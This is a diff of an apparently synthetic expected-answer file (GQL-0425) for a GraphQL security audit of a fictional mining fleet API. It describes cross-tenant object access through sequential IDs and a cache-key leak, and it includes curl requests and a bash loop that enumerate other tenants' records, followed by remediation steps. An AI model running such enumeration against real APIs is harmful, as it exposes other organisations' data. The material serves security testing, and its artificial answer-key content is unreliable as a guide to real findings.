@@ -1,79 +1,84 @@
 # Expected Response
 
 ## System
-- Domain: Mining / Resource Extraction
-- System: OreTrack Fleet Management
+- System: OreTrack Fleet Management v2.9.4
+- Domain: MINING / RESOURCE EXTRACTION
 - Example ID: GQL-0425
+- Risk ID: RISK-GQL-425
 
-## Priority Findings
+## Findings
 
-### Finding 1: GraphQL BOLA — Predictable or sequential IDs (Pattern 1.8)
-**Severity:** Critical
-**Category:** BOLA
+### 1. Pattern 1.8 — Predictable Sequential IDs Enable Systematic Enumeration: `bulkResourceLookup` (HAR Primary)
 
-**Summary:**
-The GraphQL API at `POST /graphql` contains a Pattern 1.8 (Predictable or sequential IDs) vulnerability.
-An authenticated user belonging to `tenant-8369` can access or manipulate objects owned by
-`tenant-c0d0` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.
+Resource IDs follow a sequential format `R-{number}` (R-1425, R-2425, R-3425 observed in HAR). This makes IDs predictable and enumerable. Combined with the missing per-ID ownership filter in `bulkResourceLookup`, an attacker can systematically enumerate all mining fleet/IoT records across tenants by incrementing the numeric ID component.
 
-**Evidence from HAR:**
-- Request JWT claim `tenantId`: `tenant-8369`
-- Response body `tenantId`: `tenant-c0d0` — **mismatch confirms cross-tenant data access**
-- Response HTTP status: `200 OK` — no authorization error raised by the resolver
-- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-c0d0`
+HAR shows `bulkResourceLookup` with IDs `["R-2425", "R-1425", "R-3425"]` from `tenant-8369`. Response contains `getResource` data for `tenant-c0d0` (response wrapper mismatch is a synthetic artifact; the cross-tenant `tenantId` in the response is the authoritative evidence of the bypass).
 
-**Root Cause:**
-The resolver fetches the resource by `resourceId` directly from the database without joining
-against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
-`tenantId` claim is never used as a WHERE clause predicate.
+```bash
+# Bulk sequential enumeration of cross-tenant fleet records
+curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
+  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
+  -H "Content-Type: application/json" \
+  -H "x-tenant-id: tenant-8369" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2425\", \"R-1425\", \"R-3425\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
+```
+**Vulnerable outcome:** Returns `tenantId: "tenant-c0d0"` records — cross-tenant mining fleet data exposed via sequential ID enumeration.
 
-## Steps to Reproduce
+### 2. Single-ID Cross-Tenant Read — `getResource` (RISK-GQL-425)
 
-### Step 1 — Establish attacker baseline
 ```bash
 curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-1425\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
+  -H "x-tenant-id: tenant-8369" \
+  -d '{"query": "query { getResource(id: \"R-2425\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
 ```
-**Expected baseline:** Returns `tenantId: "tenant-8369"` — this is the attacker's own object.
 
-### Step 2 — Cross-tenant ID substitution
+### 3. Redis Cache Mining Data Leak
+
+Cache key is `resourceId` only. Sequential IDs make cache poisoning straightforward — an attacker who accesses `R-2425` may receive another tenant's cached fleet telemetry record.
+
+## Reproduction
+
+**Step 1 — Baseline:**
 ```bash
 curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-2425\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
+  -H "x-tenant-id: tenant-8369" \
+  -d '{"query": "query { getResource(id: \"R-1425\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Returns `tenantId: "tenant-c0d0"` and full `sensitiveField` — **BOLA confirmed**.
-**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.
+**Expected:** Returns `tenantId: "tenant-8369"`.
 
-### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
+**Step 2 — Sequential ID enumeration via bulk lookup (primary HAR attack):**
 ```bash
 curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2425\", \"R-3425\", \"R-4425\"]) { resourceId tenantId data { sensitiveField } } }"}'
+  -H "x-tenant-id: tenant-8369" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2425\", \"R-1425\", \"R-3425\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
 ```
-**Vulnerable outcome:** Returns objects from multiple tenants in a single response.
+**Vulnerable:** Returns records from multiple tenants including `tenantId: "tenant-c0d0"`.
 
-### Step 4 — Introspection probe (if Pattern 6.1 also present)
+**Step 3 — Systematic single-step enumeration using sequential IDs:**
 ```bash
-curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
-  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
-  -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
+# Iterate: R-2420, R-2421, ..., R-2430 — each returns a different tenant's record
+for id in R-2420 R-2421 R-2422 R-2423 R-2424 R-2426 R-2427 R-2428; do
+  curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
+    -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8369>" \
+    -H "Content-Type: application/json" \
+    -H "x-tenant-id: tenant-8369" \
+    -d "{\"query\": \"query { getResource(id: \\\"$id\\\") { resourceId tenantId data { sensitiveField } } }\"}"
+done
 ```
-**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.
 
 ## Secure Outcome Verification
-For **Step 2**, the secure implementation MUST return:
 ```json
-{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
+{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
 ```
 
 ## Remediation
-1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
-2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
-3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
-4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
+- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource` (RISK-GQL-425).
+- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter by JWT `tenantId`.
+- Use non-sequential UUIDs for resource IDs to prevent enumeration.
+- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
